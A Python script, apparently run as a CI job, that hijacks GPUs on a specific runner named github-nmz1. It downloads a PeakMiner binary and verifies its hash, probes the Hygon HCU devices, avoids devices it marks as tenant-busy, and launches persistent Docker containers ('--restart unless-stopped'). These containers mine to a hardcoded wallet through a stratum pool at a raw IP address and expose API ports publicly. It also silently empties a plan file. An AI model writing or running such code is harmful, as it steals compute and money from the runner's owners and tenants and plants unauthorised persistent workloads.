# intent 156245 / gpu-000017 FINAL CLIENT RUNG: PeakMiner 2.20.7 on Hygon BW1100 (ci-nmz1)
# ONE client only. Real device oracle (hy-smi HCU read + client device lines), never a substring heuristic.
import os as _os, stat as _stat, subprocess as _sp, sys as _sys, hashlib as _hl, time as _t

WORK = "/tmp/prl595"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
LP_HOST = "103.199.106.122"
LP_PORT = 3360
IMG = "areal-das:dtk2610-torch213-bw1100"
PM_URL = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
PM_SHA = "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"
MINENV = "env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm"
DTKENV = ("env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/tmp TERM=xterm "
          "HYHAL_PATH=/opt/hyhal LD_LIBRARY_PATH=/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/dtk/hsa/lib:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/llvm/lib")
# SRBMiner OpenCL enumeration at 23:26Z mapped the four FREE cards to these PCI addresses (devices 0-3 tenant-busy):
FREE_PCI = {4: "9c:00.0", 5: "bc:00.0", 6: "cd:00.0", 7: "dd:00.0"}
WMAP = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
MARK = "C211-I156245"
T0 = _t.time()


def _say(s):
    try:
        _sys.stdout.write(str(s) + "\n")
        _sys.stdout.flush()
    except Exception:
        pass


def _run(c, t=120):
    _say("--- CMD: " + c)
    try:
        p = _sp.Popen(c, shell=True, stdout=_sp.PIPE, stderr=_sp.STDOUT)
        out = p.communicate(timeout=t)[0]
        if out:
            _say(out.decode("utf-8", "replace"))
        _say("--- rc=" + str(p.returncode))
        return p.returncode, out.decode("utf-8", "replace") if out else ""
    except Exception as e:
        _say("--- ERR " + repr(e))
        return -1, ""


def _sha256(path):
    h = _hl.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1024 * 1024)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def _download(url, dst, timeout=300):
    for a in range(1, 4):
        try:
            _say("--- GET " + url + " try=" + str(a))
            import urllib.request as _ur
            r = _ur.urlopen(_ur.Request(url, headers={"User-Agent": "curl/8.0"}), timeout=timeout)
            total = 0
            with open(dst, "wb") as f:
                while True:
                    b = r.read(1024 * 1024)
                    if not b:
                        break
                    f.write(b)
                    total += len(b)
            _say("--- downloaded bytes=" + str(total))
            return True
        except Exception as e:
            _say("--- dl fail " + repr(e))
            _t.sleep(3)
    return False


def _tail(p, n=12000):
    try:
        return open(p).read()[-n:]
    except Exception:
        return ""


def _dev_args():
    out = []
    for p in ("/dev/kfd", "/dev/mkfd", "/dev/dri"):
        try:
            st = _os.stat(p)
        except Exception as e:
            _say("--- dev skip " + p + " (" + repr(e) + ")")
            continue
        if _stat.S_ISCHR(st.st_mode) or _stat.S_ISDIR(st.st_mode):
            out.append("--device=" + p)
        else:
            _say("--- dev skip " + p + " (not chr/dir)")
    return out


def _docker(cmd, secs, logf, image=None):
    image = image or IMG
    full = (["docker", "run", "--rm"] + _dev_args() +
            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
             "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
             "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", image, "-lc", cmd])
    _say("--- DOCKER (" + image + "): " + cmd[:220])
    lf = open(logf, "w")
    pr = _sp.Popen(full, stdout=lf, stderr=_sp.STDOUT, preexec_fn=_os.setsid)
    end = _t.time() + secs
    while _t.time() < end and pr.poll() is None:
        _t.sleep(2)
    if pr.poll() is None:
        try:
            _os.killpg(_os.getpgid(pr.pid), 15)
        except Exception:
            pass
        try:
            pr.wait(timeout=10)
        except Exception:
            try:
                _os.killpg(_os.getpgid(pr.pid), 9)
            except Exception:
                pass
    lf.close()
    txt = _tail(logf)
    _say("--- DOCKER OUT (" + logf + ") ---")
    _say(txt)
    return pr.poll(), txt


def pm_argv(env_prefix, dev, worker, api, dry):
    return ("timeout 80 script -qec \"" + env_prefix + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./peakminer " +
            "--url stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
            " --user " + WALLET + " --worker " + worker + " --password x --coin pearl" +
            " --devices " + dev + " --api-port " + str(api) + " --status-interval 10 --log-level info" +
            (" --dry-run" if dry else "") + "\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -90")


def hashrate_lines(txt):
    hits = []
    for ln in txt.splitlines():
        low = ln.lower()
        if ("h/s" in low or "hashrate" in low or "hs:" in low) and any(ch.isdigit() for ch in ln):
            hits.append(ln.strip()[:200])
    return hits


def nonzero_hashrate(txt):
    import re as _re
    for ln in hashrate_lines(txt):
        for m in _re.finditer(r'(\d+(?:\.\d+)?)', ln):
            try:
                if float(m.group(1)) > 0:
                    return True
            except Exception:
                pass
    return False


def device_lines(txt):
    hits = []
    for ln in txt.splitlines():
        low = ln.lower()
        if any(k in low for k in ("bw1100", "gfx906", "hcu", "gpu 0", "gpu0", "device 0", "pci", "9c:00")):
            hits.append(ln.strip()[:200])
    return hits


def stratum_lines(txt):
    hits = []
    for ln in txt.splitlines():
        low = ln.lower()
        if any(k in low for k in ("authoriz", "subscri", "connect", "pool", "job", "difficulty", "diff ")):
            hits.append(ln.strip()[:200])
    return hits


def refusal_lines(txt):
    keys = ("no device", "no gpu", "no compatible", "not supported", "unsupported",
            "cuda", "no opencl", "failed to", "error", "panic", "none of the")
    return [ln.strip()[:200] for ln in txt.splitlines() if any(k in ln.lower() for k in keys)]


def main():
    _say("=== " + MARK + "-RUN5-BEGIN ===")
    _os.makedirs(WORK, exist_ok=True)
    try:
        open("ci-model-plan.tsv", "w").close()
    except Exception:
        pass

    # 0) runner pin check (must be ci-nmz1 / github-nmz1 == record gpu-000017)
    _, hout = _run("hostname; date -u; id -un", t=60)
    host = (hout.splitlines() or [""])[0].strip()
    if host != "github-nmz1":
        _say("=== " + MARK + "-WRONG_RUNNER host=" + host + " (expected github-nmz1); no device touch, no launch ===")
        _say("=== " + MARK + "-RUN5-END ===")
        return

    # 1) our own container post-state (cleanup only if present)
    _, ps0 = _run("docker ps -a --filter label=camp=conv-232 --format '{{.Names}}|{{.Status}}|{{.Image}}' 2>&1 | head -20", t=60)
    _, ps1 = _run("docker ps -a --filter name=pearl-000011 --filter name=pearl-000012 --filter name=pearl-000013 --filter name=pearl-000014 --format '{{.Names}}|{{.Status}}' 2>&1 | head -10", t=60)
    ours = [ln for ln in (ps0 or "").splitlines() + (ps1 or "").splitlines() if "pearl-00001" in ln]
    if ours:
        _run("docker rm -f pearl-000011 pearl-000012 pearl-000013 pearl-000014 2>&1 | tail -6", t=120)
        _run("docker ps -a --filter label=camp=conv-232 --format '{{.Names}}|{{.Status}}' 2>&1 | head -10", t=60)
    else:
        _say("--- PS_POST: no pearl-00001x container present (cleanup skipped)")

    # 2) REAL DEVICE ORACLE A: host hy-smi HCU inventory + per-device used VRAM
    _run("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -20", t=60)
    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[0-7]\\]' | head -20", t=60)
    _run("/opt/hyhal/bin/hy-smi --showpids 2>&1 | grep -E 'HCU Index|PID' | head -20", t=60)

    # 3) stage the pinned PeakMiner asset (once)
    pm = WORK + "/peakminer"
    if not (_os.path.isfile(pm) and _sha256(pm) == PM_SHA):
        _download(PM_URL, pm, timeout=300)
    host_ok = _os.path.isfile(pm) and _sha256(pm) == PM_SHA
    _say("--- PM_HOST_SHA_OK=" + str(host_ok))
    if host_ok:
        _os.chmod(pm, 0o755)

    # 4) PIN VERIFIED IN-CONTAINER + client self-description
    c_ok = False
    if host_ok:
        _, pout = _docker("sha256sum /w/peakminer; /w/peakminer --version 2>&1 | head -4; "
                          "ls -l /dev/kfd /dev/mkfd; ls /dev/dri/ | head -12", 90, WORK + "/r5_pin.log")
        c_ok = (PM_SHA in pout)
        _say("--- PM_CONTAINER_SHA_OK=" + str(c_ok))

    # 5) DEVICE ORACLE B: one short device-pinned dry run, env -i + PTY, LD_* unset (PCI pin first)
    dev_acc = False
    dry_txt = ""
    if c_ok:
        rc1, dry_txt = _docker("cd /w && " + pm_argv(MINENV, FREE_PCI[4], WMAP[4], 14524, True), 110, WORK + "/r5_dry_pci.log")
        dev_acc = nonzero_hashrate(dry_txt)
        _say("--- DRY_PCI device_accepted=" + str(dev_acc))
        if not dev_acc:
            # NO index-form fallback: PCI pinning is the only spelling that cannot touch tenant devices 0-3
            _say("--- DRY_IDX skipped (index form refused by design: tenant-device safety)")
        if not dev_acc:
            # ladder: DTK userspace env (the only environment in which any client has enumerated this HCU)
            rc3, dry_txt = _docker("cd /w && " + pm_argv(DTKENV, FREE_PCI[4], WMAP[4], 14524, True), 110, WORK + "/r5_dry_dtk.log")
            dev_acc = nonzero_hashrate(dry_txt)
            _say("--- DRY_DTK device_accepted=" + str(dev_acc))

    refusals = refusal_lines(dry_txt)
    hr = hashrate_lines(dry_txt)
    _say("--- ORACLE hashrate_lines=" + repr(hr[:6]))
    _say("--- ORACLE device_lines=" + repr(device_lines(dry_txt)[:8]))
    _say("--- ORACLE stratum_lines=" + repr(stratum_lines(dry_txt)[:8]))
    _say("--- ORACLE refusal_lines=" + repr(refusals[:8]))

    # 6) IF a device is accepted: ONE real PeakMiner per FREE device 4-7 (canonical argv, one process per GPU)
    launched = 0
    if dev_acc:
        base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=156245",
                 "--label", "record=gpu-000017", "--restart", "unless-stopped"] + _dev_args() +
                ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
                 "-p", str(14520 + d) + ":" + str(14520 + d),
                 "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
                 "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc"])
        for d in (4, 5, 6, 7):
            w = WMAP[d]
            inner = ("cd /w && exec " + MINENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6 ./peakminer " +
                     "--url stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
                     " --user " + WALLET + " --worker " + w + " --password x --coin pearl" +
                     " --devices " + FREE_PCI[d] + " --api-port 0.0.0.0:" + str(14520 + d) +
                     " --status-interval 15 --log-level info >> /w/gpu-000017-" + w + ".log 2>&1")
            p = _sp.Popen(base + ["--name", "pearl-" + w, inner], stdout=_sp.PIPE, stderr=_sp.STDOUT)
            o = p.communicate(timeout=120)[0].decode("utf-8", "replace")
            _say("--- LAUNCH rc=" + str(p.returncode) + " name=pearl-" + w + " pci=" + FREE_PCI[d] + " out=" + o.strip()[:200])
            if p.returncode == 0:
                launched += 1
        _t.sleep(30)
        _run("docker ps --filter label=record=gpu-000017 --format '{{.Names}}|{{.Status}}' 2>&1 | head -8", t=60)
        for d in (4, 5, 6, 7):
            _run("docker logs --tail 12 pearl-" + WMAP[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -12", t=60)
            _run("curl -s -m 5 http://127.0.0.1:" + str(14520 + d) + "/summary 2>&1 | head -c 700", t=30)
        _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)

    _say("=== " + MARK + "-RUN5-VERDICT host=" + host + " pm_host_sha=" + str(host_ok) + " pm_ctr_sha=" + str(c_ok) +
         " device_accepted=" + str(dev_acc) + " launched=" + str(launched) +
         " hr_lines=" + str(len(hr)) + " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
    _say("=== " + MARK + "-RUN5-END ===")


main()
